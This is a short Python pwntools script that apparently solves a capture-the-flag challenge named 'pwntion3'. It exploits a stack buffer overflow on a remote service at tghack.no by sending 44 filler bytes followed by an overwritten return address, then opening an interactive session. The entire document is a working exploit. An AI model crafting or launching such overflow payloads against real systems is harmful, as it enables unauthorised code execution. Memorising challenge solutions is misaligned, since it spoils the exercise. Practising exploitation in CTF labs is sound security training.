from pwn import *

debug = False
if debug == True:
    r = process("./pwntion3")
else:
    r = remote("pwntion3.tghack.no", 1063)

r.recvuntil("Student:")

new_return_address = p32(0x080486b6)

r.sendline("A" * 44 + new_return_address)

r.interactive()

